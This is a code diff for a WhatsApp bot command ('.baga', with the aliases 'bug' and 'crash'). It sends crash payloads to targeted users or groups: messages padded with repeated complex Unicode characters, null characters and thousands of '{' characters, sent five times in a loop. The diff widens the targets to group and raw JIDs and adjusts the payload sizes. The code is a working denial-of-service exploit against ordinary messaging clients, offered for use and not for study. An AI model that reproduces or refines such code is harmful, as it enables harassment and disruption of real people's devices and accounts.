@@ -7,11 +7,11 @@ const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 // ---------------------- Helper ---------------------- //
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// ====================== BUG FUNCTIONS ====================== //
+// ====================== BUG FUNCTIONS (STABLE) ====================== //
 
 async function RizzKenok(target, conn) {
-    const bug_char = "జ్ఞ‌ා".repeat(15000);
-    const crash_val = "\u0000".repeat(50000); // Reduced for stability
+    const bug_char = "జ్ఞ‌ා".repeat(10000);
+    const crash_val = "\u0000".repeat(30000); 
     await conn.relayMessage(target, {
         viewOnceMessageV2: {
             message: {
@@ -45,7 +45,7 @@ async function InvisibleFC(target, conn) {
                         hasMediaAttachment: false,
                     },
                     body: { text: "System Lagging..." },
-                    nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
+                    nativeFlowMessage: { messageParamsJson: "{".repeat(5000) },
                     contextInfo: { participant: target, mentionedJid: [target] },
                 },
             },
@@ -58,51 +58,67 @@ async function InvisibleFC(target, conn) {
 
 cmd({
     pattern: "baga",
-    alias: ["bugsystem", "crash-v2"],
-    react: "🩸",
-    desc: "Extreme system bug / crash command.",
+    alias: ["bug", "crash"],
+    react: "🧬",
+    desc: "Multi-JID supported Bug/Crash command.",
     category: "main",
     filename: __filename
 },
-async (robin, mek, m, { from, text, reply, sender, isOwner }) => {
+async (robin, mek, m, { from, text, reply, sender }) => {
     try {
-        // Target එක තෝරා ගැනීම (Mentioned, Quoted හෝ Number)
-        let target = m.mentionedJid[0] 
-            ? m.mentionedJid[0] 
-            : (m.quoted ? m.quoted.sender : (text ? text.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : null));
+        let target = "";
 
-        if (!target) {
-            return reply("❌ *කරුණාකර Target එකක් Mention කරන්න හෝ අංකය ලබා දෙන්න!*");
+        // 1. Tag (Mention) එකක් තිබේදැයි බැලීම
+        if (m.mentionedJid && m.mentionedJid.length > 0) {
+            target = m.mentionedJid[0];
+        } 
+        // 2. Message එකකට Reply කර තිබේදැයි බැලීම
+        else if (m.quoted) {
+            target = m.quoted.sender || m.quoted.participant || m.quoted.key.remoteJid;
+        } 
+        // 3. කෙලින්ම JID එකක් හෝ අංකයක් Text එකේ තිබේදැයි බැලීම
+        else if (text) {
+            let input = text.trim();
+            if (input.includes('@')) {
+                target = input; // කෙලින්ම JID එකක් දුන්නොත් (e.g. lid, g.us)
+            } else {
+                target = input.replace(/[^0-9]/g, '') + "@s.whatsapp.net"; // අංකයක් පමණක් දුන්නොත්
+            }
         }
 
-        // ආරක්ෂාව සඳහා Owner ට පමණක් මෙය ලබා දීම නිර්දේශ කෙරේ
-        // if (!isOwner) return reply("🔒 This is an owner-only powerful command!");
+        // Target එකක් හමු නොවුණහොත්
+        if (!target || target === "") {
+            return reply("❌ *Target එකක් හමු නොවීය!*\n\n*භාවිතය:*\n1. .baga @tag\n2. .baga (reply to message)\n3. .baga 123456@lid\n4. .baga 123456@g.us");
+        }
 
         const uptimeStr = runtime(process.uptime());
         const statusText = `╭─〔 *☣️ BUG ATTACK ☣️*〕─◉
 │
-│🎯 *Target*: ${target.split('@')[0]}
+│🎯 *Target*: ${target}
 │⏰ *Bot Uptime*: ${uptimeStr}
 │⚡ *Status*: Sending Exploits...
 ╰─────────────────────────────⊷
 > © 𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝐌𝗗 🌛`;
 
-        // මුලින්ම විස්තරය යැවීම
         await robin.sendMessage(from, { text: statusText }, { quoted: mek });
 
-        // Bug එක යැවීම (මෙහිදී loops ගණන අඩු කර ඇත්තේ බෝට් එක crash වීම වැළැක්වීමටයි)
+        // Bug Loops (බෝට් එක ආරක්ෂා කරගනිමින් යැවීම)
         for (let i = 0; i < 5; i++) {
-            await InvisibleFC(target, robin);
-            await sleep(2000);
-            await RizzKenok(target, robin);
-            console.log(`Bug sent to: ${target} - Loop: ${i+1}`);
+            try {
+                await InvisibleFC(target, robin);
+                await sleep(2000);
+                await RizzKenok(target, robin);
+                console.log(`[BUG SENT] -> ${target} | Loop: ${i+1}`);
+            } catch (err) {
+                console.log("Internal Loop Error: ", err.message);
+            }
         }
 
         await robin.sendMessage(from, { react: { text: "✅", key: mek.key } });
-        reply(`✅ *Attack successfully sent to ${target.split('@')[0]}*`);
+        reply(`✅ *Bug successfully sent to:* \n${target}`);
 
     } catch (e) {
         console.error("Baga Cmd Error:", e);
-        reply(`⚠️ Error: ${e.message}`);
+        reply(`⚠️ Bug Error: ${e.message}`);
     }
 });
